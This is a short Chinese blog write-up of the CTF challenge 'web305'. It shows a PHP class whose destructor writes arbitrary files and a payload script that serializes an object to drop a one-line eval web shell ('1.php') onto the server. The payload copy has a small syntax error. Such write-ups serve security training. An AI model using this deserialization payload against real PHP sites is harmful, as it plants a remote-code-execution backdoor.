---
title: "[代码审计]实战篇:web305"
desc: TonyD0g
date: 2022-02-09 22:11:27
tags: 代码审计
---
<font size=4 >

###### [版本0x1] 
###### 2022-02-09

## web305:
## 自动化扫描:
![avatar](https://s4.ax1x.com/2022/02/09/HJ4px1.png)

## 查看class.php,很明显的反序列化漏洞:
```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 13:20:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 13:33:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
```


### payload:
```
<?php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct{
		file_put_contents($this->username, $this->password);
	}
}
echo urlencode(serialize(new user('1.php','<?php eval($_POST[1]);?>')));
?>
```
## 这里必须要urlencode,否则执行不成功:
![avatar](https://s4.ax1x.com/2022/02/09/HJ4kVO.png)

## flag藏数据库里了:
![avatar](https://s4.ax1x.com/2022/02/09/HJ4CKx.png)

![avatar](https://s4.ax1x.com/2022/02/09/HJ4S2R.png)

![avatar](https://s4.ax1x.com/2022/02/09/HJ4AaD.png)

## 另外一个文件,和web303同一个漏洞点,不赘述:
![avatar](https://s4.ax1x.com/2022/02/09/HJ4EIe.png)
</font>